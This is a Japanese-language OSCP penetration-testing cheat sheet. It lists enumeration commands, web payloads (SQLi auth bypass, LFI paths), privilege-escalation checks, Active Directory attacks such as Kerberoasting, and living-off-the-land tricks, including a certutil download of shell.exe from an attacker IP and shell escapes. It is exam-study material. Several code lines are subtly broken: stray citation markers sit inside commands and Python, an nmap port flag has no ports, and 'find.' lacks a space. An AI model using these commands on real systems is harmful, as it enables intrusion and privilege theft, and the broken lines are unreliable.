# OSCP対応：高度侵入テスト・技術フレームワーク 決定版

本ドキュメントは、Kitsun3Sec、HackTricks、PayloadsAllTheThings、LOLBAS、GTFOBins、PEASS-ng、およびデータサイエンス手法を統合した、OSCP試験および実戦的なレッドチーム・オペレーションのための完全なチートシートである。

---

## 1. 偵察と情報収集 (Reconnaissance)

偵察は攻撃の成否を分ける。効率的なスキャンでアタックサーフェスを特定する 。

### 1.1 ネットワークスキャン (Nmap)

Bash

```
# 全ポート高速スキャン (TCP)
nmap -p- --min-rate 1000 -Pn -oN nmap_full.txt [IP]

# 特定されたポートへの詳細スキャン (スクリプト/バージョン検出)
nmap -sC -sV -p -oN nmap_detail.txt [IP]

# UDP主要20ポートのスキャン
nmap -sU --top-ports 20 [IP]

# 防火牆回避 (フラグメンテーション/デコイ)
nmap -f -D RND:10 [IP][1, 2]
```

### 1.2 DNS列挙

|**レコード**|**コマンド例**|**目的**|
|---|---|---|
|A|`dig a [domain] @[ns]`|IPアドレスの特定|
|MX|`dig mx [domain]`|メールサーバーの特定|
|AXFR|`dig axfr [domain] @[ns]`|ゾーン転送の試行|
|SRV|`nslookup -type=SRV _ldap._tcp.[domain]`|ADサービス（DC）の特定|

---

## 2. プロトコル別調査ロジック (Protocol Enumeration)

### 2.1 SMB (Port 139, 445)

OSCPにおいて最も重要なプロトコルの一つ。

- **ヌルセッション確認:** `rpcclient -U "" [IP]` または `enum4linux -a [IP]` 。
    
- **共有フォルダ探索:** `smbclient -L //[IP] -N` 。
    
- **NetExecによる一括列挙:** `nxc smb [IP] --shares -u '' -p ''` 。
    

### 2.2 SNMP (Port 161 UDP)

- **コミュニティ名特定:** `onesixtyone -c /usr/share/doc/onesixtyone/dict.txt [IP]` 。
    
- **MIB走査:** `snmpwalk -c public -v2c [IP] 1.3.6.1.4.1.77.1.2.25` (ユーザーリスト) 。
    

### 2.3 LDAP (Port 389, 636)

- **RootDSE取得:** `ldapsearch -x -H ldap://[IP] -s base "(objectclass=*)"` 。
    
- **ADユーザー抽出:** `ldapsearch -x -H ldap://[IP] -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName` 。
    

### 2.4 データベース (MSSQL, Oracle)

- **MSSQL:** `nxc mssql [IP] -u 'sa' -p 'pass' -M mssql_priv` 。
    
- **Oracle:** `odat sidguesser -s [IP]` -> `odat passwordguesser -s [IP] -d` 。
    

---

## 3. Webアプリケーション脆弱性 (Web Exploitation)

### 3.1 ディレクトリ列挙

Bash

```
# Gobusterによる再帰的探索
gobuster dir -u http://[IP] -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,zip 

# Niktoによる既知の設定ミス調査
nikto -h http://[IP] -maxtime 30m 
```

### 3.2 頻出ペイロード (PayloadsAllTheThings)

- **LFI (Local File Inclusion):**
    
    - Linux: `/etc/passwd`
        
    - Windows: `C:\Windows\System32\drivers\etc\hosts`
        
    - PHP Wrapper: `php://filter/convert.base64-encode/resource=index.php`
        
- **SQL Injection (SQLi):**
    
    - 認証バイパス: `' OR 1=1 -- -`
        
    - MSSQLバージョン確認: `SELECT @@version`
        
- **Command Injection:**
    
    - セパレータの活用: `;`, `|`, `&&`, `%0a`
        

---

## 4. 権限昇格ロジック (Privilege Escalation)

PEASS-ng (WinPEAS/LinPEAS) の出力を精査する際の優先順位 。

### 4.1 Windows (WinPEAS)

WinPEASは「赤背景・黄色文字」を最優先で確認する 。

1. **システム情報:** OSバージョンとパッチ（Hotfixes）未適用状況。EternalBlue等。
    
2. **サービス脆弱性:**
    
    - **Unquoted Service Paths:** `wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v """` 。
        
    - **脆弱なサービス権限:** 低権限ユーザーが `binPath` を変更可能か。
        
3. **認証情報:** `unattend.xml`、レジストリ、`dir /s cred` 。
    
4. **トークン特権:** `SeImpersonatePrivilege` (JuicyPotato) 等 。
    

### 4.2 Linux (LinPEAS)

1. **SUIDバイパス:** `find / -perm -4000 -user root 2>/dev/null` を実行し、GTFOBinsと比較 。
    
2. **Sudo権限:** `sudo -l` でパスワードなし実行可能なコマンドを確認 。
    
3. **Cronジョブ:** `/etc/crontab` 内の書き込み可能なスクリプトを特定 。
    
4. **ケーパビリティ:** `getcap -r / 2>/dev/null` で特定の権限を確認 。
    

---

## 5. Active Directory (AD) 支配

OSCPのADセット（40ポイント）を攻略するための流れ 。

### 5.1 AD列挙

Bash

```
# BloodHound.pyによる関係性の可視化
bloodhound-python -u 'user' -p 'pass' -d domain.local -dc dc01.domain.local -c All 

# NetExecによるドメインユーザー/グループ列挙
nxc smb [IP] -u 'user' -p 'pass' --users --groups 
```

### 5.2 主要なAD攻撃

- **Kerberoasting:** サービスアカウント（SPN）のハッシュを要求。
    
    - `impacket-GetUserSPNs domain.local/user:pass -dc-ip [IP] -request`
        
- **AS-REP Roasting:** 事前認証不要なユーザーからハッシュを窃取 。
    
- **AD CS (Certificate Services) 攻撃:**
    
    - **ESC1:** 任意のSANを指定可能な証明書テンプレートを悪用 。
        
    - **ESC8:** Web登録インターフェースへのNTLMリレー 。
        

---

## 6. Living Off The Land (LOTL)

標準ツールを利用した検知回避 。

### 6.1 LOLBAS (Windows)

- **Certutil.exe:** ファイルダウンロードとBase64デコード 。
    
    - `certutil -urlcache -f http://[IP]/shell.exe shell.exe`
        
- **Mshta.exe:** HTAを介したコード実行 。
    
- **Bitsadmin.exe:** 目立たないファイル転送 。
    

### 6.2 GTFOBins (Linux)

- **find:** シェルへのエスケープ: `find. -exec /bin/sh \; -quit` 。
    
- **vi / vim:** `:!/bin/sh` でrootシェルを起動（Sudo/SUID時） 。
    

---

## 7. 解析の自動化とPython (ds-cheatsheets)

ログ解析やデータ処理を効率化する。

### 7.1 正規表現 (Regex) による抽出

IPv4アドレスをログから抽出するパターン ：

$$\text{Regex for IPv4: } \backslash b(?: \backslash d\{1,3\} \backslash. )\{3\} \backslash d\{1,3\} \backslash b$$

### 7.2 Pandasによる統計解析 (Python)

Python

```
import pandas as pd
df = pd.read_csv('access.log')
# エラー発生数が多いIPアドレスのトップ10を表示
print(df[df['status'] >= 400]['ip'].value_counts().head(10)) [1, 23, 24]
```

---

## 8. 必須ツール・リソースリンク集

|**カテゴリ**|**ツール / リソース名**|**公式リンク / Gitリポジトリ**|
|---|---|---|
|**総合ナレッジ**|HackTricks|[book.hacktricks.xyz](https://book.hacktricks.xyz/)|
||PayloadsAllTheThings|([https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings))|
||Pentest Cheat Sheets|([https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets](https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets))|
|**権限昇格**|WinPEAS / LinPEAS|(https://github.com/peass-ng/PEASS-ng)|
||PrivescCheck|[github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)|
|**LOTL**|LOLBAS (Windows)|[lolbas-project.github.io](https://lolbas-project.github.io/)|
||GTFOBins (Linux)|[gtfobins.github.io](https://gtfobins.github.io/)|
|**AD / ネットワーク**|NetExec (nxc)|[github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)|
||Impacket Suite|[github.com/fortra/impacket](https://github.com/fortra/impacket)|
||Responder|([https://github.com/lgandx/Responder](https://github.com/lgandx/Responder))|
||BloodHound.py|(https://github.com/dirkjanm/BloodHound.py)|
||enum4linux-ng|[github.com/cddmp/enum4linux-ng](https://github.com/cddmp/enum4linux-ng)|
|**Web / DB**|sqlmap|[github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)|
||ODAT (Oracle)|[github.com/quentinhardy/odat](https://github.com/quentinhardy/odat)|
|**自動化 / 解析**|ds-cheatsheets|[github.com/FavioVazquez/ds-cheatsheets](https://github.com/FavioVazquez/ds-cheatsheets)|
||nmap-parse|[github.com/jonny1102/nmap-parse](https://github.com/jonny1102/nmap-parse)|

---

## 9. 「Try Harder」チェックリスト (行き詰まった時)

- [ ] 全ポートスキャンを `-p-` で完了させたか？
    
- [ ] UDPの重要ポート（DNS, SNMP, TFTP）を忘れていないか？
    
- [ ] HTTPのソースコード内に隠されたコメントや開発パスはないか？
    
- [ ] SMBの共有フォルダ内に `web.config` や `unattend.xml` はないか？
    
- [ ] 別のホストへのピボット（踏み台）が必要なAD環境ではないか？
    
- [ ] 使用しているエクスプロイトのアーキテクチャ（x86/x64）は正しいか？
    
- [ ] LOLBinsを使って検知を回避したり、権限をバイパスできないか？